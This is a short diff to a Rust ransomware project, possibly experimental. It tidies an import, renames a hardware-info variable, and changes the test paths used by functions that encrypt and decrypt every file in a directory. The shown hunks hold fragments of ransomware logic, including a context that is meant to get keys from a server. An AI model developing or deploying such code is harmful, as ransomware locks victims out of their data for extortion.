@@ -21,7 +21,7 @@ use std::{
 use lazy_static::lazy_static;
 
 use rsa::{
-    pkcs8::DecodePrivateKey, pkcs8::DecodePublicKey, pkcs8::EncodePublicKey, Oaep, RsaPrivateKey,
+    pkcs8::DecodePrivateKey, pkcs8::DecodePublicKey, pkcs8::EncodePublicKey, RsaPrivateKey,
     RsaPublicKey,
 };
 
@@ -80,7 +80,7 @@ impl RansomContext {
     fn create_from_sever() -> Self {
         debug!("Creating new context from \"server\"");
 
-        let hardware_info = hardware_info::get_hardware_info();
+        let _hardware_info = hardware_info::get_hardware_info();
 
         // TODO Negotiate with server to obtain encryption keys, and remove hardcoded ones
 
@@ -345,7 +345,7 @@ pub fn initiate_ransom_process() {
     debug!("Encrypting files!");
 
     ransom_context
-        .encrypt_all_files(&PathBuf::from("test"))
+        .encrypt_all_files(&PathBuf::from("./test"))
         .expect("Could not encrypt all files in directory");
 
     debug!("Encrypted all files!");
@@ -368,7 +368,7 @@ pub fn initiate_ransom_process() {
     debug!("Decrypting files!");
 
     ransom_context
-        .decrypt_all_files(&PathBuf::from("test"))
+        .decrypt_all_files(&PathBuf::from("./test"))
         .expect("Could not decrypt all files in directory");
 
     debug!("Decrypted all files!");
